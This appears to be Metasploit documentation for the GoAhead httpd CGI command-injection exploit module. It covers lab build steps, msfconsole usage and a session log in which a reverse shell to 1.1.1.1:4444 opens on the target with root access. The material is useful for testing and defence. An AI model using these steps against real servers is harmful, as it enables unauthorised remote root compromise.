## Vulnerable Application

  The GoAhead httpd server between versions 2.5 and 3.6.4 which have CGI enabled, are vulnerable to 
  a command injection vulnerability where its possible to call and `LD_PRELOAD` on a user supplied file delivered
  in a post request, resulting in RCE.

### Kali 2017.3 and Ubuntu 16.04 Install Instructions

These instructions are based on the vulerability analysis by [elttam.com.au](https://www.elttam.com.au/blog/goahead/)

```
git clone https://github.com/embedthis/goahead.git
cd goahead/
git checkout tags/v3.6.4 -q
make > /dev/null
cd test
gcc ./cgitest.c -o cgi-bin/cgitest
sudo ../build/linux-x64-default/bin/goahead
```

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploit/linux/http/goahead_cgi_exec```
  4. Do: ```set rhost [ip]```
  5. Do: ```exploit```
  6. You should get a shell.

## Options

  **CGIDIR**

  The name of the CGI directory, default is `/cgi-bin/`.

  **CGINAME**

  The name of a valid CGI script within the CGI directory.  The default is valid for the example build shown in this doc.

## Scenarios

### GoAhead 3.6.4 on Ubuntu 16.04 x64

```
[*] Processing goahead.rc for ERB directives.
resource (goahead.rc)> use exploit/linux/http/goahead_cgi_exec
resource (goahead.rc)> set verbose true
verbose => true
resource (goahead.rc)> set rhost 2.2.2.2
rhost => 2.2.2.2
resource (goahead.rc)> check
[*] Validating CGI is enabled against URI: /cgi-bin/qjXI7SU9fQ7oDVulCu7m5jw5qUr7jxwCXgqHxBoZ
[*] 2.2.2.2:80 The target is not exploitable.
resource (goahead.rc)> exploit
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Sending Exploit to /cgi-bin/cgitest
[*] Command shell session 1 opened (1.1.1.1:4444 -> 2.2.2.2:45762) at 2017-12-23 17:12:39 -0500
uname -a
Linux goahead 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

whoami
root
```
